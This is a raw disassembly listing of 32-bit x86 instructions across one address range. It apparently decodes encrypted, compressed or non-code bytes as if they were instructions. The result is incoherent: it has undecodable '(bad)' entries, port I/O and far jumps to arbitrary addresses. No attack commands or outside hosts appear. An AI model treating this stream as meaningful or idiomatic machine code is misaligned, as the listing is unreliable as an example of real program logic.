  417d69:	pop    edx
  417d6a:	or     BYTE PTR [esp+esi*8],0xf2
  417d6e:	(bad)  [edi+ecx*8-0x5e8130fc]
  417d75:	mov    WORD PTR [ecx],gs
  417d77:	daa    
  417d78:	out    dx,eax
  417d79:	cmp    al,0x3a
  417d7b:	inc    ebx
  417d7c:	std    
  417d7d:	in     eax,dx
  417d7e:	xor    al,0xc8
  417d80:	mov    al,0xf4
  417d82:	ins    DWORD PTR es:[edi],dx
  417d83:	mov    edi,0x440b0923
  417d88:	scas   eax,DWORD PTR es:[edi]
  417d89:	pop    esp
  417d8a:	test   al,0xf1
  417d8c:	pusha  
  417d8d:	fidivr DWORD PTR [eax]
  417d8f:	add    DWORD PTR [ebp+0x46],ebx
  417d92:	jg     0x417d86
  417d94:	push   0x89f66ecf
  417d99:	data16 jecxz 0x417d5a
  417d9c:	mov    dh,0x3
  417d9e:	ds mov ecx,0xcca05a4a
  417da4:	dec    eax
  417da5:	dec    ebx
  417da6:	sub    al,0x2d
  417da8:	shl    DWORD PTR [eax+0x1c4cfdd7],1
  417dae:	fst    DWORD PTR [eax]
  417db0:	cmp    eax,0x2eda0294
  417db5:	scas   al,BYTE PTR es:[edi]
  417db6:	lock sbb BYTE PTR [edx-0x79],ah
  417dba:	xchg   edi,eax
  417dbb:	call   0x8071:0xd14ff1f
  417dc2:	and    edx,DWORD PTR [ebx]
  417dc4:	jl     0x417d54
  417dc6:	jnp    0x417de4
  417dc8:	call   0xc491b4e1
  417dcd:	pop    es
  417dce:	scas   eax,DWORD PTR es:[edi]
  417dcf:	push   ecx
  417dd0:	loop   0x417dee
  417dd2:	dec    edx
  417dd3:	jbe    0x417de7
  417dd5:	ds std 
  417dd7:	jo     0x417d8e
  417dd9:	test   al,al
  417ddb:	mov    edx,0x6e9b439
  417de0:	mov    WORD PTR [ebx+eax*2-0x5f77079b],es
  417de7:	mov    ah,BYTE PTR [edx-0x6b]
  417dea:	mov    ebx,0x4337dc9a
  417def:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417df0:	fmul   DWORD PTR [eax-0x5c]
  417df3:	pop    esi
  417df4:	(bad)  
  417df6:	loope  0x417dde
  417df8:	inc    esi
  417df9:	scas   al,BYTE PTR es:[edi]
  417dfa:	push   0x640ccec5
  417dff:	mov    bl,0xac
  417e01:	int3   
  417e02:	cmp    BYTE PTR [ecx+edx*8+0x6fb8bde],bl
  417e09:	retf   0xc1f3
  417e0c:	cld    
  417e0d:	addr16 aad 0xc9
  417e10:	mov    dl,0x9f
  417e12:	push   edi
  417e13:	loope  0x417e3b
  417e15:	lods   eax,DWORD PTR ds:[esi]
  417e16:	in     al,dx
  417e17:	jb     0x417dc3
  417e19:	xchg   edx,eax
  417e1a:	lock sar BYTE PTR [ebp-0x53],0x4b
  417e1f:	shl    bh,cl
  417e21:	sub    al,BYTE PTR [edi+ebx*1]
  417e24:	mov    esp,ebp
  417e26:	xor    eax,0x1afb8ed2
  417e2b:	sub    DWORD PTR [eax],ebp
  417e2d:	pushf  
  417e2e:	inc    ebp
  417e2f:	aad    0xa0
  417e31:	mov    ch,0x5
  417e33:	jecxz  0x417de4
  417e35:	cmp    DWORD PTR [ecx+0x7aa27f75],0x6b
  417e3c:	or     bh,BYTE PTR [eax+0x67c6621d]
  417e42:	iret   
  417e43:	sbb    DWORD PTR [edx-0xcfa42b4],edx
  417e49:	mov    BYTE PTR [esi+eax*2],dh
  417e4c:	pop    esi
  417e4d:	inc    ebp
  417e4e:	retf   0xd515
  417e51:	jne    0x417e71
  417e53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e54:	into   
  417e55:	or     eax,DWORD PTR gs:[eax]
  417e58:	jg     0x417e1f
  417e5a:	or     eax,0x1aab3697
  417e5f:	push   0xffffffe0
  417e61:	and    BYTE PTR [ebx],ah
  417e63:	mov    WORD PTR [esi-0x777605bc],gs
  417e69:	imul   edx,DWORD PTR [esi+0x49],0x6e
  417e6d:	pop    esi
  417e6e:	mul    edx
  417e70:	push   esp
  417e71:	mov    ?,edi
  417e73:	jp     0x417e1f
  417e75:	rol    bh,0xd9
  417e78:	sbb    DWORD PTR [ebx+0x65],ecx
  417e7b:	sub    cl,al
  417e7d:	jae    0x417e1e
  417e7f:	add    eax,0x62e78f37
  417e84:	mov    eax,0x21255b89
  417e89:	test   DWORD PTR [esi],ecx
  417e8b:	cmp    al,BYTE PTR [edx-0x19]
  417e8e:	shl    BYTE PTR [ebx+0x52818e3],0x4a
  417e95:	js     0x417efa
  417e97:	mov    DWORD PTR [edx+ecx*1],esi
  417e9a:	sub    dl,BYTE PTR [esi+0x3c]
  417e9d:	clc    
  417e9e:	fadd   DWORD PTR [ecx+eiz*2-0x2ae9d567]
  417ea5:	cmc    
  417ea6:	ret    
  417ea7:	pop    ecx
  417ea8:	mov    ebx,0xb24bb15b
  417ead:	cmp    DWORD PTR [edi+0x32],0xfce3ab6e
  417eb4:	add    al,0x94
  417eb6:	push   ebp
  417eb7:	js     0x417e60
  417eb9:	div    BYTE PTR [ecx]
  417ebb:	lahf   
  417ebc:	sub    eax,0xe4136609
  417ec1:	lods   eax,DWORD PTR ds:[si]
  417ec3:	fs inc eax
  417ec5:	into   
  417ec6:	dec    DWORD PTR [ecx-0xb]
  417ec9:	pop    es
  417eca:	push   0x15da182a
  417ecf:	or     esi,DWORD PTR [ebx]
  417ed1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ed2:	std    
  417ed3:	xchg   bh,ah
  417ed5:	sbb    bh,BYTE PTR [edx+0x39963dfa]
  417edb:	ret    0x333b
  417ede:	jb     0x417f13
  417ee0:	add    al,0x92
  417ee2:	fcmovnb st,st(6)
  417ee4:	daa    
  417ee5:	sbb    BYTE PTR ss:[edi+ebx*1-0x7a],bl
  417eea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417eeb:	lods   al,BYTE PTR ds:[esi]
  417eec:	out    0xda,eax
  417eee:	push   eax
  417eef:	adc    esp,ebp
  417ef1:	call   0x68f5de68
  417ef6:	ret    
  417ef7:	fbld   TBYTE PTR [edi+0x31]
  417efa:	hlt    
  417efb:	jge    0x417f3b
  417efd:	(bad)  
  417efe:	loope  0x417ef9
  417f00:	scas   al,BYTE PTR es:[edi]
  417f01:	adc    DWORD PTR [ebx-0x1d80700f],ebx
  417f07:	test   eax,0x6a96dec2
  417f0c:	or     cl,bl
  417f0e:	add    BYTE PTR [eax-0x47e053ea],0x2b
  417f15:	out    dx,al
  417f16:	test   BYTE PTR ds:0x7ace7c06,dh
  417f1c:	inc    ebx
  417f1d:	jae    0x417f83
  417f1f:	daa    
  417f20:	xchg   ebp,eax
  417f21:	cmp    bh,bl
  417f23:	push   eax
  417f24:	mov    dl,0x75
  417f26:	sub    BYTE PTR [edi],ch
  417f28:	add    ch,BYTE PTR [esi-0x52]
  417f2b:	scas   al,BYTE PTR es:[edi]
  417f2c:	ficom  WORD PTR [edi]
  417f2e:	pop    esi
  417f2f:	jo     0x417f13
  417f31:	push   es
  417f32:	pmaxsw mm6,QWORD PTR [ebp+ebp*1-0x624bdf11]
  417f3a:	repnz add esi,DWORD PTR [eax+eax*4]
  417f3e:	cdq    
  417f3f:	sub    eax,0x431f3b1b
  417f44:	cmp    dh,BYTE PTR [edx+0x3e]
  417f47:	in     al,dx
  417f48:	xlat   BYTE PTR ds:[ebx]
  417f49:	lea    ecx,[ebp-0x17f875aa]
  417f4f:	bound  esi,QWORD PTR [edx+0x0]
  417f52:	arpl   WORD PTR [edx-0x67],cx
  417f55:	xchg   esp,eax
  417f56:	sub    esi,0xffffff83
  417f59:	and    cl,ah
  417f5b:	cmp    eax,ecx
  417f5d:	into   
  417f5e:	ficomp WORD PTR [eax+0x3a]
  417f61:	add    BYTE PTR [edi],ch
  417f63:	lods   al,BYTE PTR ds:[esi]
  417f64:	xor    al,0x22
  417f66:	fnstcw WORD PTR [edi+0x58]
  417f69:	push   ecx
  417f6a:	test   ch,0x1e
  417f6d:	lods   eax,DWORD PTR ds:[esi]
  417f6e:	xor    eax,0x6a4647f7
  417f73:	mov    ch,0x80
  417f75:	push   es
  417f76:	out    dx,al
  417f77:	mov    dl,0xe3
  417f79:	adc    eax,0xcce33781
  417f7e:	retf   
  417f7f:	aas    
  417f80:	bound  ecx,QWORD PTR [edx-0x45]
  417f83:	xor    DWORD PTR [esi],ecx
  417f85:	sub    esi,DWORD PTR [eax+0xfa41132]
  417f8b:	(bad)  
  417f8d:	cmc    
  417f8e:	fmul   st(7),st
  417f90:	and    DWORD PTR ds:0xff1b1c00,eax
  417f96:	imul   ebp,DWORD PTR [eax+0x2cc7cbbd],0xfc15d7f2
  417fa0:	sbb    DWORD PTR [edx],eax
  417fa2:	in     eax,dx
  417fa3:	pop    ebx
  417fa4:	rep outs dx,BYTE PTR ds:[esi]
  417fa6:	mov    ebp,DWORD PTR [ebp-0x1eced5ed]
  417fac:	jb     0x417f3c
  417fae:	addr16 cmp al,0xf0
  417fb1:	ret    
  417fb2:	js     0x41801e
  417fb4:	xchg   ecx,eax
  417fb5:	pop    ebx
  417fb6:	push   edi
  417fb7:	imul   ebp,edi,0x37
  417fba:	jb     0x417f63
  417fbc:	jno    0x417fde
  417fbe:	shr    BYTE PTR [esi+0x35fa17a],0x3a
  417fc5:	cwde   
  417fc6:	rcl    DWORD PTR [esp+ebp*2+0x6eae6b31],0x49
  417fce:	push   cs
  417fcf:	jno    0x41802a
  417fd1:	lahf   
  417fd2:	rcr    dh,cl
  417fd4:	xor    esi,DWORD PTR ds:[ecx-0xa]
  417fd8:	sub    edi,ebx
  417fda:	shl    edx,0xd2
  417fdd:	mov    ebx,0x5d410928
  417fe2:	arpl   WORD PTR [edi+0x4],sp
  417fe5:	cld    
  417fe6:	sub    eax,DWORD PTR [eax]
  417fe8:	es xchg ecx,eax
  417fea:	fidivr WORD PTR [edi+0x4a816eb]
  417ff0:	add    edi,edx
  417ff2:	jmp    0x8fee1d1b
  417ff7:	jnp    0x417fbc
  417ff9:	lea    esi,[ebp+0x63]
  417ffc:	push   es
  417ffd:	xor    ebp,edx
  417fff:	jge    0x417fbd
  418001:	lock getsec 
  418004:	xchg   ecx,eax
  418005:	fild   DWORD PTR [ecx-0x46]
  418008:	or     al,0x72
  41800a:	mov    ah,0x39
  41800c:	jp     0x418005
  41800e:	repnz in al,dx
  418010:	lea    esi,[ebx]
  418012:	retf   
  418013:	mov    DWORD PTR [eax+0x3e],eax
  418016:	push   ss
  418017:	jmp    0x417fbc
  418019:	mov    ah,0xdf
  41801b:	mov    bl,BYTE PTR [edi-0x5ca26da7]
  418021:	sbb    dh,cl
  418023:	add    eax,0x393ab1e7
  418028:	push   edi
  418029:	add    ebp,esp
  41802b:	sub    ecx,DWORD PTR ds:0xe280cfb9
  418031:	push   edi
  418032:	xchg   ecx,eax
  418033:	push   ss
  418034:	push   es
  418035:	cmp    esp,DWORD PTR [ebx]
  418037:	sbb    cl,bl
  418039:	or     DWORD PTR [edx-0x20],edx
  41803c:	(bad)  
  41803d:	sar    DWORD PTR [ecx-0x43629f5a],cl
  418043:	std    
  418044:	in     al,0x95
  418046:	adc    edx,DWORD PTR [ecx+0x8dd2e2b]
  41804c:	repnz inc BYTE PTR [ebx]
  41804f:	mov    ecx,0xab8fc569
  418054:	xor    BYTE PTR [ecx-0x627ccdb2],dh
  41805a:	(bad)  
  41805b:	xlat   BYTE PTR ds:[ebx]
  41805c:	lahf   
  41805d:	pop    eax
  41805e:	outs   dx,DWORD PTR ds:[esi]
  41805f:	add    BYTE PTR [edx],cl
  418061:	in     al,dx
  418062:	aaa    
  418063:	leave  
  418064:	or     BYTE PTR [esi-0x52],ah
  418067:	out    0x6c,al
  418069:	dec    edi
  41806a:	add    BYTE PTR [eax],ch
  41806c:	push   edi
  41806d:	loopne 0x418056
  41806f:	js     0x4180ad
  418071:	or     ecx,esi
  418073:	add    bl,BYTE PTR [edx+0x5b]
  418076:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418077:	test   eax,0xea016791
  41807c:	test   DWORD PTR [esi+0x5e],0x72df5822
  418083:	and    BYTE PTR [edi],ah
  418085:	jae    0x418057
  418087:	mov    al,ds:0x929820fe
  41808c:	adc    DWORD PTR [ebx],ebx
  41808e:	jle    0x4180cb
  418090:	add    eax,0x652756d4
  418095:	ss mov bh,0xf6
  418098:	loopne 0x41801b
  41809a:	xchg   esi,eax
  41809b:	mov    ds:0x6e979bc6,eax
  4180a0:	call   0x2c87:0xccafbe74
  4180a7:	xchg   BYTE PTR [esi+0x32],al
  4180aa:	dec    ebx
  4180ab:	inc    DWORD PTR [edx+ecx*4]
  4180ae:	fidivr DWORD PTR [edx+0x4c]
  4180b1:	push   ebp
  4180b2:	cmp    al,0x5a
  4180b4:	not    ebp
  4180b6:	xor    ch,BYTE PTR [esi]
  4180b8:	cmp    al,0x1e
  4180ba:	je     0x418092
  4180bc:	dec    edx
  4180bd:	sti    
  4180be:	mov    ch,0xe3
  4180c0:	mov    DWORD PTR [ebp+0x706eb482],ecx
  4180c6:	adc    bh,BYTE PTR [ecx+0x78]
  4180c9:	mov    ebp,0x44cc87bf
  4180ce:	loopne 0x418126
  4180d0:	or     ah,dl
  4180d2:	pushf  
  4180d3:	cs mov cl,0x6c
  4180d6:	dec    esp
  4180d7:	ret    0x534
  4180da:	sub    al,al
  4180dc:	pop    es
  4180dd:	add    edx,ecx
  4180df:	sub    BYTE PTR [eax],cl
  4180e1:	ficom  DWORD PTR [edx]
  4180e3:	xchg   ebp,eax
  4180e4:	xor    ah,dl
  4180e6:	and    esi,DWORD PTR [eax+0x15]
  4180e9:	inc    eax
  4180ea:	ds inc edi
  4180ec:	test   WORD PTR [ebx+ebp*4+0x39],cx
  4180f1:	mov    dl,0x8c
  4180f3:	xchg   esi,eax
  4180f4:	jnp    0x4180c7
  4180f6:	ss hlt 
  4180f8:	mov    ch,al
  4180fa:	(bad)  
  4180fc:	mov    eax,eax
  4180fe:	jle    0x418143
  418100:	int3   
  418101:	mov    al,ds:0x3d5bf06d
  418106:	push   ebx
  418107:	mov    fs,WORD PTR [edi-0x5d5e243d]
  41810d:	push   esp
  41810e:	sub    DWORD PTR [ebp+ecx*4-0x48161baf],eax
  418115:	push   0xe3ff9be3
  41811a:	add    BYTE PTR [ecx-0x72],al
  41811d:	xlat   BYTE PTR ds:[ebx]
  41811e:	add    bl,BYTE PTR [ecx+ebx*2+0xe]
  418122:	mov    dh,0x5c
  418124:	jmp    0x706e106e
  418129:	scas   eax,DWORD PTR es:[edi]
  41812a:	outs   dx,BYTE PTR ds:[esi]
  41812b:	sbb    ecx,DWORD PTR [edi+0x771ab5bd]
  418131:	jg     0x4180d8
  418133:	daa    
  418134:	and    edi,DWORD PTR [ebp+eiz*8+0x2b]
  418138:	int    0x1c
  41813a:	jmp    0xb7715073
  41813f:	(bad)  
  418140:	and    DWORD PTR [ebx+ebp*1],0xffffff81
  418144:	je     0x418193
  418146:	in     al,0xda
  418148:	cs and eax,0xa3012e71
  41814e:	cmp    DWORD PTR [eax],edi
  418150:	xchg   esp,eax
  418151:	mov    eax,0x6a288111
  418156:	ja     0x4180f2
  418158:	les    esp,FWORD PTR [edi-0x30]
  41815b:	xchg   BYTE PTR [edx+0x2c],bl
  41815e:	cmp    eax,0xe85e0efe
  418163:	cld    
  418164:	pusha  
  418165:	test   al,0x94
  418167:	pop    ebp
  418168:	(bad)  
  418169:	out    dx,eax
  41816a:	sar    BYTE PTR ss:[eax+0x40ff673c],0x76
  418172:	stc    
  418173:	xchg   ebp,eax
  418174:	xor    BYTE PTR [esi-0x4f],bh
  418177:	inc    ebx
  418178:	int3   
  418179:	mov    eax,0xce92a08f
  41817e:	adc    DWORD PTR [edx-0x2f],esp
  418181:	jmp    0xb90b:0x4411eaf3
  418188:	sbb    eax,0xc93902fd
  41818d:	adc    eax,0xa93ff7fa
  418192:	iret   
  418193:	push   0xffffff9b
  418195:	out    dx,eax
  418196:	push   cs
  418197:	out    dx,eax
  418198:	inc    ebx
  418199:	add    edi,DWORD PTR [edx-0x2e]
  41819c:	aaa    
  41819d:	inc    esi
  41819e:	fld    QWORD PTR [esi]
  4181a0:	mov    eax,ds:0x6345d937
  4181a5:	push   esp
  4181a6:	mov    edx,0xbdbc7404
  4181ab:	(bad)  
  4181ac:	(bad)  
  4181ae:	xchg   DWORD PTR [ebp+0x3c430ae1],ebp
  4181b4:	xchg   DWORD PTR [ebx-0x192277e5],esp
  4181ba:	inc    eax
  4181bb:	imul   esp,DWORD PTR [ebp-0x9],0xffffffcb
  4181bf:	std    
  4181c0:	and    DWORD PTR [edi-0x1d],esi
  4181c3:	push   es
  4181c4:	push   cs
  4181c5:	popf   
  4181c6:	test   eax,0xb4908499
  4181cb:	dec    esi
  4181cc:	and    ebx,ecx
  4181ce:	pop    ebp
  4181cf:	outs   dx,BYTE PTR ds:[esi]
  4181d0:	adc    al,0xd2
  4181d2:	mov    fs,WORD PTR [ebx-0x54]
  4181d5:	xchg   esi,eax
  4181d6:	sub    eax,0x49ef8f54
  4181db:	imul   esi,DWORD PTR [ecx-0x3d622614],0xffffff92
  4181e2:	jb     0x418202
  4181e4:	xchg   BYTE PTR [esi-0x19],dh
  4181e7:	dec    edi
  4181e8:	addr16 fninit 
  4181eb:	dec    esp
  4181ec:	retf   
  4181ed:	lds    edi,FWORD PTR ds:0x640a30a6
  4181f3:	iret   
  4181f4:	(bad)  
  4181f5:	cwde   
  4181f6:	ss sbb eax,0x1a8cd5f
  4181fc:	(bad)  
  4181fd:	jno    0x41824b
  4181ff:	mov    edi,0x57a23ad6
  418204:	xchg   ebp,eax
  418205:	arpl   WORD PTR [ecx-0x53e428e8],cx
  41820b:	add    al,BYTE PTR [esi-0x6277c158]
  418211:	sub    ebp,DWORD PTR [ebp+0x72]
  418214:	xor    esp,DWORD PTR [eax+eiz*4+0x58]
  418218:	xlat   BYTE PTR ds:[ebx]
  418219:	jnp    0x41823a
  41821b:	lea    ebp,[ecx-0x54f8dd6]
  418221:	ins    DWORD PTR es:[edi],dx
  418222:	and    dh,dl
  418224:	mov    al,ds:0x4e30529c
  418229:	in     al,0x71
  41822b:	push   es
  41822c:	mov    ds:0x662ee8ea,al
  418231:	jmp    0xd82d:0x8b6e490b
  418238:	mov    cl,0xee
  41823a:	xor    edi,DWORD PTR [edi-0x2fe399aa]
  418240:	jne    0x418279
  418242:	mov    dh,BYTE PTR [ecx-0x44]
  418245:	lods   eax,DWORD PTR ds:[esi]
  418246:	push   ecx
  418247:	mov    edx,0x7376239b
  41824c:	scas   eax,DWORD PTR es:[edi]
  41824d:	arpl   bx,sp
  41824f:	ins    DWORD PTR es:[edi],dx
  418250:	iret   
  418251:	(bad)  
  418252:	sub    ecx,DWORD PTR [edx]
  418254:	pop    esi
  418255:	dec    edi
  418256:	ins    BYTE PTR es:[edi],dx
  418257:	pop    edi
  418258:	and    BYTE PTR [esi-0x2d],bh
  41825b:	mov    esi,0x8210cb10
  418260:	rcr    DWORD PTR [eax-0x64],1
  418263:	mov    edx,0x54bad93c
  418268:	arpl   WORD PTR [ecx],cx
  41826a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41826b:	push   edi
  41826c:	or     edx,DWORD PTR [ecx+0x117a387e]
  418272:	lock jb 0x418293
  418275:	mov    bh,0x5b
  418277:	in     eax,0xac
  418279:	push   0x58
  41827b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41827c:	and    eax,0x968f7b62
  418281:	gs retf 
  418283:	inc    esp
  418284:	mov    fs,WORD PTR [eax+0x43ad2c90]
  41828a:	or     bl,BYTE PTR [eax]
  41828c:	jle    0x41823e
  41828e:	xor    ebx,edx
  418290:	cmc    
  418291:	in     al,dx
  418292:	cmp    eax,0x88f1fd0c
  418297:	out    0xbc,eax
  418299:	cmp    DWORD PTR fs:[edx-0x1932a680],ecx
  4182a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182a1:	fisub  DWORD PTR [ebx+0x5a]
  4182a4:	pop    ebp
  4182a5:	xchg   ebp,eax
  4182a6:	sbb    BYTE PTR [eax-0x64e37d26],cl
  4182ac:	test   al,0xd
  4182ae:	je     0x41828b
  4182b0:	xor    edi,ebx
  4182b2:	jecxz  0x4182d0
  4182b4:	jle    0x418242
  4182b6:	arpl   di,ax
  4182b8:	and    al,0x48
  4182ba:	dec    ecx
  4182bb:	data16 (bad) 
  4182bd:	das    
  4182be:	test   DWORD PTR [ecx+0xa],0xd46ddf98
  4182c5:	mov    ecx,DWORD PTR [eax-0x17]
  4182c8:	inc    ebp
  4182c9:	(bad)  
  4182ca:	sbb    edx,0xffffffdc
  4182cd:	jne    0x4182a0
  4182cf:	jl     0x418342
  4182d1:	xchg   ebp,eax
  4182d2:	in     eax,0xb9
  4182d4:	lds    esp,FWORD PTR [esp+edx*2]
  4182d7:	push   edx
  4182d8:	lea    esp,[ebp-0x4f]
  4182db:	(bad)  
  4182dc:	push   0x84ddc723
  4182e1:	adc    al,0xc4
  4182e3:	mov    esp,0x88224a54
  4182e8:	push   ebp
  4182e9:	and    DWORD PTR [eax+ecx*4+0x64ddf61d],eax
  4182f0:	fst    QWORD PTR [eax-0x3a]
  4182f3:	jns    0x418356
  4182f5:	sbb    al,0x42
  4182f7:	xchg   edi,eax
  4182f8:	dec    edi
  4182f9:	sbb    cl,ah
  4182fb:	sbb    BYTE PTR [esi+ecx*1-0x35],ah
  4182ff:	push   cs
  418300:	repz xchg ebx,eax
  418302:	mov    al,BYTE PTR [ebx+0x57]
  418305:	push   ds
  418306:	int    0x7
  418308:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418309:	fnsave [esi]
  41830b:	sub    eax,0x9d00514
  418310:	add    al,0x67
  418312:	mov    ah,0x65
  418314:	ror    DWORD PTR [edx+0x572ae442],0x24
  41831b:	enter  0x7d5b,0x3
  41831f:	fistp  QWORD PTR [ebp+0x1142d44d]
  418325:	(bad)
  41832a:	xor    al,dl
  41832c:	push   es
  41832d:	outs   dx,BYTE PTR ds:[esi]
  41832e:	leave  
  41832f:	cmc    
  418330:	aam    0x92
  418332:	nop
  418333:	xchg   edi,eax
  418334:	out    dx,al
  418335:	add    esi,DWORD PTR [edi-0x1e]
  418338:	ret    0xaa2b
  41833b:	inc    eax
  41833c:	imul   edx,DWORD PTR [ebp+edx*4+0x76],0xdde83406
  418344:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418345:	sbb    ecx,DWORD PTR [eax+0x2e]
  418348:	push   cs
  418349:	mov    al,ds:0x337ae3bf
  41834e:	loope  0x418396
  418350:	enter  0xfdc0,0x94
  418354:	pop    edx
  418355:	shl    eax,0x78
  418358:	push   ecx
  418359:	test   BYTE PTR [ebx+0x1993ef24],cl
  41835f:	mov    al,0x58
  418361:	fucomip st,st(4)
  418363:	jnp    0x418307
  418365:	aaa    
  418366:	xcrypt-ofb (bad)
  418367:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418368:	jmp    0x1da1:0xb3b854b9
  41836f:	jb     0x4183a5
  418371:	fld    QWORD PTR [eax-0x20427e7b]
  418377:	lock jnp 0x4183b8
  41837a:	call   0x484b:0xd161b06b
  418381:	mov    ecx,0x85cc4a88
  418386:	sub    ah,bl
  418388:	push   esp
  418389:	push   ss
  41838a:	and    BYTE PTR [esi+0x6dde869],bh
  418390:	xchg   edi,eax
  418391:	jno    0x41833b
  418393:	pop    sp
  418395:	std    
  418396:	mov    bh,0x3b
  418398:	and    eax,0x4a86d98b
  41839d:	pop    ss
  41839e:	mov    ebp,0xfcead102
  4183a3:	jge    0x418406
  4183a5:	cmp    BYTE PTR [edx],0x8f
  4183a8:	sbb    DWORD PTR [ebp-0x55389c0],esi
  4183ae:	lods   eax,DWORD PTR ds:[esi]
  4183af:	shr    BYTE PTR [ebp-0x458f0f45],0x6d
  4183b6:	push   0x6
  4183b8:	clc    
  4183b9:	cmp    eax,0x69f22654
  4183be:	jbe    0x418382
  4183c0:	aam    0x49
  4183c2:	aas    
  4183c3:	in     eax,0xf
  4183c5:	jae    0x418380
  4183c7:	push   ebp
  4183c8:	sbb    al,0xc7
  4183ca:	mov    ds:0xbcb06504,al
  4183cf:	lea    eax,[ebx]
  4183d1:	xchg   esp,eax
  4183d2:	out    dx,al
  4183d3:	cmp    bl,bh
  4183d5:	cld    
  4183d6:	aas    
  4183d7:	push   edx
  4183d8:	add    al,0x83
  4183da:	xlat   BYTE PTR ds:[ebx]
  4183db:	out    0xd,eax
  4183dd:	xchg   edi,eax
  4183de:	mov    ds:0xec4a2fe4,eax
  4183e3:	or     ebx,eax
  4183e5:	sub    DWORD PTR [esp+edi*8],esi
  4183e8:	xchg   esi,eax
  4183e9:	out    0x82,al
  4183eb:	int    0x24
  4183ed:	pushf  
  4183ee:	gs inc ecx
  4183f0:	hlt    
  4183f1:	adc    al,0x4c
  4183f3:	rcl    BYTE PTR [edi],1
  4183f5:	or     al,0xc7
  4183f7:	sahf   
  4183f8:	or     al,0x30
  4183fa:	mov    ebp,0xcb2d961b
  4183ff:	pop    ds
  418400:	xor    DWORD PTR [ecx+0xc31b042],0x23
  418407:	sub    al,0x56
  418409:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41840a:	push   esi
  41840b:	push   esp
  41840c:	sub    DWORD PTR [edx+0x34],ebp
  41840f:	fwait
  418410:	xlat   BYTE PTR ds:[ebx]
  418411:	outs   dx,DWORD PTR ds:[esi]
  418412:	cmp    bl,BYTE PTR [eax-0x54b5138e]
  418418:	ret    
  418419:	xor    eax,0x44808039
  41841e:	outs   dx,DWORD PTR ds:[esi]
  41841f:	jnp    0x41842c
  418421:	rcl    DWORD PTR [edi+ecx*1],1
  418424:	mov    dl,0x47
  418426:	bnd jg 0x4183f8
  418429:	pop    ecx
  41842a:	cmp    DWORD PTR [edi-0x2e],esi
  41842d:	mov    al,ds:0x4e5bfb53
  418432:	in     eax,dx
  418433:	fwait
  418434:	mov    esi,0xd5b5d4a5
  418439:	call   0x5f08940c
  41843e:	rol    ebp,0x2c
  418441:	adc    DWORD PTR [ebp+0x7a1e8662],0xdae0439e
  41844b:	rcr    DWORD PTR [ecx+0x78af31fd],0x28
  418452:	outs   dx,DWORD PTR ds:[esi]
  418453:	fistp  WORD PTR [ecx+0x41]
  418456:	stos   DWORD PTR es:[edi],eax
  418457:	jmp    0x418452
  418459:	pop    esp
  41845a:	xchg   ebp,eax
  41845b:	or     ah,BYTE PTR [edi-0x3334e3f]
  418461:	int3   
  418462:	das    
  418463:	inc    eax
  418464:	push   ecx
  418465:	add    esp,eax
  418467:	cmp    ah,BYTE PTR [edi-0x271d2336]
  41846d:	out    dx,al
  41846e:	rol    BYTE PTR [ecx-0x64],0x19
  418472:	clc    
  418473:	je     0x4184e9
  418475:	and    al,0x69
  418477:	cwde   
  418478:	icebp  
  418479:	lods   eax,DWORD PTR ds:[esi]
  41847a:	ss ja  0x41841d
  41847d:	fld    QWORD PTR [ecx-0x4e53458d]
  418483:	push   0x679eabe1
  418488:	jge    0x418482
  41848a:	test   BYTE PTR [edx-0x36],bh
  41848d:	mov    ds:0x6d39e544,eax
  418492:	mov    edi,0x4c4b9496
  418497:	fdivr  QWORD PTR [ecx-0x676ca972]
  41849d:	sub    ebx,DWORD PTR [eax+ebx*2]
  4184a0:	mov    ss,WORD PTR [ebx+ebp*4-0x69]
  4184a4:	ja     0x4184eb
  4184a6:	dec    esp
  4184a7:	into   
  4184a8:	rol    DWORD PTR [ecx],0x57
  4184ab:	scas   al,BYTE PTR es:[edi]
  4184ac:	gs pop ecx
  4184ae:	js     0x418496
  4184b0:	clc    
  4184b1:	adc    eax,0xc8410c57
  4184b6:	and    al,0xe7
  4184b8:	jmp    0xdb6f40b4
  4184bd:	mov    eax,0xda37ef9f
  4184c2:	mov    edx,0x6845e3d3
  4184c7:	push   edx
  4184c8:	sahf   
  4184c9:	nop
  4184ca:	or     edx,eax
  4184cc:	push   ecx
  4184cd:	push   ebp
  4184ce:	inc    ecx
  4184cf:	mov    bh,BYTE PTR [edx-0x78]
  4184d2:	xchg   ebx,eax
  4184d3:	popf   
  4184d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184d5:	pop    ecx
  4184d6:	jne    0x4184e0
  4184d8:	into   
  4184d9:	jmp    0x418479
  4184db:	inc    ebp
  4184dc:	push   ecx
  4184dd:	pop    esi
  4184de:	fld    QWORD PTR [ebx+0x71]
  4184e1:	fbld   TBYTE PTR [eax]
  4184e3:	fnstenv [edi-0x5c]
  4184e6:	mov    al,0xcd
  4184e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184e9:	rcr    DWORD PTR [edi-0x22808bc8],1
  4184ef:	jb     0x4184e9
  4184f1:	fstp   TBYTE PTR [ecx]
  4184f3:	xor    bl,BYTE PTR [edi-0x7f]
  4184f6:	cmp    edi,edx
  4184f8:	icebp  
  4184f9:	idiv   BYTE PTR [eax-0x7cdd0c7f]
  4184ff:	test   BYTE PTR [bx+di+0x4a],0xc7
  418504:	dec    edi
  418505:	stc    
  418506:	sbb    eax,0x50895da2
  41850b:	jae    0x418545
  41850d:	xchg   esi,eax
  41850e:	cmp    BYTE PTR [esp+edi*1-0x786c5227],cl
  418515:	enter  0xb8e3,0xe2
  418519:	adc    BYTE PTR [eax],bl
  41851b:	outs   dx,DWORD PTR ds:[esi]
  41851c:	in     al,0x96
  41851e:	or     edi,DWORD PTR [esi+ebx*4+0x5826f6d]
  418525:	xor    edi,esi
  418527:	dec    esp
  418528:	mov    dh,0x11
  41852a:	sub    al,0xa1
  41852c:	and    ch,bl
